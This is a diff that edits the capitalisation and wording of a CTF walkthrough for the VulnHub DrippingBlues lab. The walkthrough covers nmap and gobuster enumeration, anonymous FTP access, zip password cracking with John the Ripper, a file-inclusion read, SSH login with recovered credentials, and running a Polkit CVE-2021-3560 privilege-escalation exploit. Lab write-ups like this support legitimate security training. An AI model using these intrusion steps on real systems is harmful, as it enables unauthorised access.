@@ -1,11 +1,11 @@
 [Download Link](https://download.vulnhub.com/drippingblues/drippingblues.ova)
 
-finding ip of the target machine 
+Finding IP of the target machine 
 ```
 sudo arp-scan -l
 ```
 
-nmap scan
+Nmap scan
 ```
 nmap -sV -O -T4 --min-rate=1000 $ip
 ```
@@ -22,7 +22,7 @@ OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:
 OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
 ```
 
-port scan:
+Port scan:
 ```
 nmap -sC -sV -Pn -p21,22,80 $ip
 ```
@@ -57,16 +57,16 @@ PORT   STATE SERVICE VERSION
 |_http-server-header: Apache/2.4.41 (Ubuntu)
 
 ```
-saw anon ftp login allowed
+Saw anonymous FTP login allowed
 
-login with anon
+Login with anonymous
 ```
 ftp $ip
 ```
-username: `anonymous`
-password: `anonymous`
+Username: `anonymous`
+Password: `anonymous`
 
-did something and exit
+Did something and exit
 ```ftp
 ftp> ls
 229 Entering Extended Passive Mode (|||61947|)
@@ -85,7 +85,7 @@ ftp> exit
 
 ```
 
-unzip the `respectmydrip.zip`
+Unzip the `respectmydrip.zip`
 ```
 unzip respectmydrip.zip
 ```
@@ -94,9 +94,9 @@ output:
 Archive:  respectmydrip.zip
 [respectmydrip.zip] respectmydrip.txt password: 
 ```
-saw its password protected
+Saw it's password protected
 
-used jtR to crack the zip pass
+Used JtR to crack the zip password
 ```
 zip2john respectmydrip.zip > hash.txt && john hash.txt
 ```
@@ -117,10 +117,10 @@ Use the "--show" option to display all of the cracked passwords reliably
 Session completed. 
 
 ```
-got the password of the zip: `072528035`
+Got the password of the zip: `072528035`
 
-went to http 
-run gobuster
+Went to HTTP 
+Run Gobuster
 ```
 gobuster dir -u http://$ip -w /usr/share/dirb/wordlists/big.txt -t 300 -x txt,php,html -q
 ```
@@ -140,40 +140,40 @@ output:
 /server-status        (Status: 403) [Size: 277]
 ```
 
-checked the `robots.txt`
-got 2 pages as 
+Checked the `robots.txt`
+Got 2 pages as 
 `User-agent: *`
 `Disallow: /dripisreal.txt`
 `Disallow: /etc/dripispowerful.html`
 
-went to `/dripisreal.txt`
-got some information about the password
-nothing works :(
+Went to `/dripisreal.txt`
+Got some information about the password
+Nothing works :(
 
-went to  `/etc/dripispowerful.html`
+Went to `/etc/dripispowerful.html`
 `http://10.170.71.84/index.php?drip=/etc/dripispowerful.html`
-got an image from there
-`password is:
+Got an image from there
+`Password is:
 `imdrippinbiatch`
 
- tried ssh to login on thugger
+Tried SSH to login as thugger
  ```
  ssh thugger@$ip
  ```
- password: imdrippinbiatch
-logged in as user and got the user flag
+Password: imdrippinbiatch
+Logged in as user and got the user flag
 ```
 5C50FC503A2ABE93B4C5EE3425496521
 ```
 
-trying exploits:
-dirty pipe: failed
-dirty creds: failed
-pwn kit: failed
-pol kit: success
+Trying exploits:
+Dirty Pipe: failed
+Dirty Creds: failed
+Pwnkit: failed
+Polkit: success
 https://github.com/Almorabea/Polkit-exploit/blob/main/CVE-2021-3560.py
 
-download the exploit it in target machine
+Download the exploit on the target machine
 ```
 chmod +x polkit.py
 python3 polkit.py
